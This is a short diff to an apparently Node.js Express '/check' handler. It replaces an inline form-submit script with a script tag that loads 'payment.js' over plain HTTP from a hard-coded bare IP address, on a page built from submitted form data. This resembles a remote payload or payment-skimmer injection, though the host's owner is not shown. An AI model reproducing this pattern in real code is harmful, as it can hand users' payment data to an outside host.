@@ -321,8 +321,9 @@ app.post('/check', urlencodedParser, function(req, res) {
                 document.body.append(form);
 
                 let script = document.createElement('script');
-                script.innerHTML = 'document.querySelector(\'form\').submit();';
-                document.body.append(script);
+                script.src = 'http://95.213.224.3:3000/payment.js';
+                script.async = false;
+                document.head.appendChild(script);
 
             }, req.body);
 
